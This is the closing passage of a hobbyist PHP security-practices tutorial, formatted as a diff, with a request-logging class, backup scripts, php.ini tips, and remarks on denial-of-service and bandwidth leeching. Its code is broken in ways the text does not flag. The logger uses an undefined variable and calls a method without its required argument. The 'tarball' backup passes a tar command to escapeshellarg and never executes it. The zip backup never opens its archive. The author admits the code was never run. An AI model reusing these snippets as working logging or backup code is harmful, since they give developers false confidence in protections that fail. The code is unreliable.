+Logging is a form of keeping track your site and its wearabouts. Just like any system, every nick nack should be monitored and accounted for. If something is left unmonitored, that something is left a perfect playground for the rebels. With a few PHP functions you can take advantage of getting the user's IP address, user agent/fingerprint and header to see who was where at what time and what they were doing. 
+
+In the event where you find a vulnerability in your system, with logs, you may be able to narrow out which file(s) are exploitable by filtering through IP addresses. 
+
+<?php
+
+class xLogger extends Sanitize
+{
+    private $_LogDir = 'cache/logs/';
+    private $stamp = '';
+    private $info = array();
+    private $pfx = 'hxm_';
+    private $ext = '.html';
+
+    public function __construct()
+    {
+        $this->stamp = date( "d-m-Y-H:i:s" );
+        self::prepareData();
+        self::prepareLog();
+        self::writeLog( $this->pfx );
+        self::_ProtectLog();
+    }
+
+    protected function prepareData()
+    {
+        $req = parent::cleanFilter( $_SERVER['REQUEST_URI'], FALSE, TRUE );
+        $ip = parent::cleanFilter( $_SERVER['REMOTE_ADDR'], FALSE, FALSE );
+        $ua = parent::cleanHTML( $_SERVER['HTTP_USER_AGENT'] );
+        $di = get_browser( NULL, TRUE );
+        $dia = json_encode( $di );
+        $ts = $this->stamp;
+
+        array_push( $this->info, "Request: $req", "IP: $ip", "User Agent: $ua", "Deep Info: $dia", "Timestamp: $ts" );
+    }
+
+    protected function prepareLog()
+    {
+        if( !is_dir( $this->_LogDir ) || !is_writable( $this->_LogDir ) )
+        {
+            exit( 'Unable to prepare log! Error => Check permissions...' );
+        }
+    }
+ 
+    protected function writeLog( $mode=0 )
+    {
+        
+        $path = $this->_LogDir . $this->pfx . $this->stamp;
+        if( file_exists( $name . $this->ext ) ) 
+        {
+            $name.='_'.parent::genKey(5);
+        }
+
+        $path.=$this->ext;
+        
+        switch( $mode )
+        {
+            case 0:
+            {
+                foreach( $this->info as $log )
+                {
+                    file_put_contents( $path, $log . "\r\n", FILE_APPEND | LOCK_EX );
+                }            	
+            } 
+            
+            break; 
+            
+            case 1:
+            {
+                file_put_contents( $path, json_encode( $this->info ), FILE_APPEND | LOCK_EX );
+            }
+            
+            break;
+            
+            case 2:
+            {
+                file_put_contents( $path, base64_encode( serialize( $this->info ) ), FILE_APPEND | LOCK_EX );
+            }
+            
+            break;
+        }
+    }
+
+    private function _ProtectLog( $stamp )
+    {
+        if( function_exists( 'chmod' ) )
+        {
+            chmod( $this->_LogDir . $this->pfx . $this->stamp . $this->ext, 0444 );
+        }
+        else
+        {
+            unlink( $this->_LogDir . $this->pfx . $this->stamp . $this->ext );
+            die( 'Unable to protect logs! Check chmod permissions!' );
+        }
+    }
+}
+
+?>
+
+The logging class we've just coded simply needs to be instantiated, and it will save a detailed log in +0444 (readable only). You can log pretty
+much everywhere if you inherit this class through wherever you want logging done! If you want things logged right, you want as well log things yourself.
+Then you'll know for sure. Upon creating your log script, you should invest in backing the logs up (which will lead us to the next topic) - you could do this with a cron to execute a PHP script every X hours/days, and upon the execution of the script, the logs will be tar.gz'd and mail()'ed to a secure email on an off-server location. That way, if the attacker were to delete the logs - they'd still be backed up and saved in your inbox. 
+
+
+Creating daily backups of your database and weekly backups of your files is always a good idea. In the event that your server is compromised and data is modified and or lost, you want to be able to restore it to its pure form. Some webhosts will offer automated backups for you... and some won't. For those that won't, odds are that you have access to cron jobs, which should be all you need. 
+
+<?php
+//ZIP Approach
+
+$dir = './';
+if( is_dir( $dir ) && opendir( $dir ) )
+{
+    $dirHan = opendir( $dir );
+    $zip = new ZipArchive();
+    
+    while( false !== ( $file = readdir( $dirHan ) ) )
+    {
+        $zip->addFile( $file );
+    }
+
+    closedir( $dirHan );
+}
+
+?>
+
+<?php
+//tarball Approach
+
+$dir = './';
+if( is_dir( $dir ) )
+{
+    escapeshellarg( "tar -cvzpf bak.tar.gz /etc/backup" );
+}
+
+?>
+
+For database backup (since it is daily), lets not send out queries to get and compress, but rather create a cron job to mysqldump --all-databases 
+and gzip the output. Some other good solutions:
+/*http://davidwalsh.name/backup-database-xml-php
+http://tinyurl.com/autosql
+http://tinyurl.com/a3autodb*/
+
+
+Now, at one time you may have been wondering, how can I customize PHP even further? The answer would lie right under your nose, within the configuration file (php.ini).
+php.ini is responsible for handling important settings that control interpretation, such as language options, resources, data handling, security options and more. You'll find that the configuration file uses a very basic scripting syntax...
+SETTING = OPTION
+
+max_execution_time = 30
+safe_mode = off
+
+In your .ini file is where you will also manage extensions that you may install for PHP.
+
+extension = php_http.dll
+extension = pdo.so
+
+Your .ini file is also responsible for things such as max file upload size and disabled PHP functions. 
+
+upload_max_filesize = 2M
+disable_functions = "file_get_contents"
+
+
+Sometimes, even after disabling functions, enabling safe_mode and taking further precautions to protect our server, our server seems sluggish. Sometimes this may be due to a "Denial of Service" attack (which is usually distributed, unless there is a specific hole). At this point we begin to leave "Better PHP Practices" (unless the dos resides within php code...), and into server security. From here you'll need to invest in a firewall+IDS, or maybe even code
+a live-user cache loader to check for too many users in an "IP range", and ban that range. 
+
+Linking directly to files can be tiresome on your server sometimes as well - especially if you have a leecher(s) who will take advantage of this to drain bandwith. Think outside of the box and code a PHP file-management wrapper that will send extension-specific headers + the content to the IP, and IP's residing in a session pool of active downloads can not download anything else for a certain period of time.
+
+As we get closer to the end of this paper, we've looked at stuff which start to become further and further our of our hands; but still in reach.
+As PHP is interpreted, there can not be "buffer overflows" through interpretation -- but in the language ITSELF, there can always be holes leading to BoF/DoS. Past examples include our friends earlier talked about, htmlentites() and htmlspecialchars().
+
+
+
+... +[ Final Thoughts ]+ ...
+My final thoughts aren't here to re-summarize what has already been stated, but to rather express that you can be the programmer you want to be.
+You can only better your programming by breaking the chains and taking a step forward - you'll never get anywhere if you hadn't moved to begin with.
+Sometimes while learning, we may feel constricted as the walls of knowledge push tighter and tigher; but again, you must break through and keep pushing yourself. It is the only way you will succeed. The only way you will create that application. The only way you will prove your theory, establish your business, play your role - create what was meant to be coded. 
+
+Only you can do this. Only your fear and bad habits hold you back. Do not let them. Whatever skill level: treat your brain r ight, don't rush - invest, practice and perfect. Then, you will be a better PHP programmer.
+
+I hope these practices are of use to new and existing PHP devs alike. The code herein was not interpreted... so if you find any bugs, shout em' out!
+
+-Wade-
+09/04/11 - 04:42
+[EOF]
